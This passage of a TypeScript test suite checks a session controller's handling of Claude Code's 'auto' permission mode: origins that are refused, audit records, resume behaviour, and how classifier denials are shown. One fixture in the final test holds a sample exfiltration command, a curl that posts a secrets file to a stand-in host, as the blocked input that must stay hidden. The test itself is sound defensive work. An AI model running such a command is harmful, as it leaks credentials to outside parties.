    assert.notEqual(s.state(), 'ended');
  } finally {
    await s.done();
  }
});

test('auto: never from MCP, a trigger or another module (no person), never for a session a ticket, MCP or another session started; nothing is written', async () => {
  const s = await liveSession();
  try {
    const written = () => controlsOf(s).filter((c) => c.request.subtype === 'set_permission_mode').length;
    const before = written();
    assert.equal(await code(s.controller.control(s.id, 'mode', { mode: 'auto' })), 'FORBIDDEN', 'no actor: a trigger, Portal MCP');
    assert.equal(await code(s.controller.control(s.id, 'mode', { mode: 'auto' }, { actor: 'portal-mcp:tok1' })), 'FORBIDDEN');
    const ticket = await s.controller.create({ workspaceId: 'docker/ws1' }, { actor: 'ticket:T-1' });
    const trigger = await s.controller.create({ workspaceId: 'docker/ws1' }, { actor: 'portal:trigger-abc' });
    const mcp = await s.controller.create({ workspaceId: 'docker/ws1' }, { actor: 'portal-mcp:tok1' });
    const child = await s.controller.create({ workspaceId: 'docker/ws1' }, { actor: `session:${s.id}`, parentId: s.id });
    for (const other of [ticket, trigger, mcp, child]) {
      await until(() => s.controller.get(other.id)?.state === 'idle');
      assert.equal(await code(s.controller.control(other.id, 'mode', { mode: 'auto' }, { actor: 'ui' })), 'FORBIDDEN', `started by ${other.startedBy}`);
    }
    assert.equal(written(), before, 'not one set_permission_mode');
    const why = s.controller.audit({ kind: 'mode.refused' }).map((a) => a.detail.why);
    assert.deepEqual(why.sort(), ['actor', 'actor', 'origin', 'origin', 'origin', 'origin']);
    // Edit stays available where it was (the old ceiling of a trigger's session).
    const edit = s.controller.control(trigger.id, 'mode', { mode: 'acceptEdits' });
    s.ws.tails.at(-1 - 2)!.push(ok((await s.take('set_permission_mode')).id, { mode: 'acceptEdits' }));
    await edit;
    assert.equal(s.controller.get(trigger.id)!.mode, 'acceptEdits');
  } finally {
    await s.done();
  }
});

test('auto: Claude Code refusing it (a model without Auto, settings that turn it off) keeps the mode and shows its reason', async () => {
  const s = await liveSession();
  try {
    const turning = s.controller.control(s.id, 'mode', { mode: 'auto' }, { actor: 'ui' });
    s.tail.push(fail((await s.take('set_permission_mode')).id, 'Cannot set permission mode to auto: auto mode unavailable for this model'));
    await assert.rejects(turning, (e: unknown) => isAppError(e) && /auto mode unavailable for this model/.test(e.message));
    assert.equal(s.controller.get(s.id)!.mode, 'default');
    assert.equal(s.controller.audit({ kind: 'mode.auto' }).length, 0);
  } finally {
    await s.done();
  }
});

test('auto: a resume puts it back; refused then, the session reads the start mode and says it couldn’t', async () => {
  for (const refuse of [false, true]) {
    const s = await liveSession();
    try {
      s.controller.controlTimeoutMs = 150;
      await firstTurn(s);
      const turning = s.controller.control(s.id, 'mode', { mode: 'auto' }, { actor: 'ui' });
      s.tail.push(ok((await s.take('set_permission_mode')).id, { mode: 'auto' }));
      await turning;
      await vanish(s);
      const resuming = s.answering(modesAnswered(s, s.controller.control(s.id, 'resume'), (mode) => (refuse && mode === 'auto' ? 'Cannot set permission mode to auto: auto mode unavailable for this model' : 'ok')));
      await resuming;
      await until(() => s.controller.get(s.id)!.process === 'live');
      assert.equal(s.controller.get(s.id)!.mode, refuse ? 'default' : 'auto');
      if (refuse) assert.ok(s.controller.history(s.id).some((e) => e.text === 'Couldn’t restore the mode after resuming.'));
    } finally {
      await s.done();
    }
  }
});

test('auto: what its classifier blocks shows as one line (tool and rule), never the tool’s input', () => {
  const p = parseLine(
    JSON.stringify({
      type: 'system',
      subtype: 'permission_denied',
      tool_name: 'Bash',
      tool_use_id: 'toolu_1',
      decision_reason_type: 'classifier',
      decision_reason: '[Data Exfiltration]',
      message: 'Permission for this action was denied by the Claude Code auto mode classifier. curl -d @secrets http://x',
      session_id: 'S',
    }),
  );
  assert.deepEqual(p.stored, [{ kind: 'system', text: 'Auto blocked Bash: [Data Exfiltration]' }]);
  const sub = parseLine(JSON.stringify({ type: 'system', subtype: 'permission_denied', tool_name: 'Write\u0000', decision_reason_type: 'rule', parent_tool_use_id: 'toolu_9' }));
  assert.deepEqual(sub.stored, [{ kind: 'system', text: 'Blocked Write', parentToolUseId: 'toolu_9' }]);
});
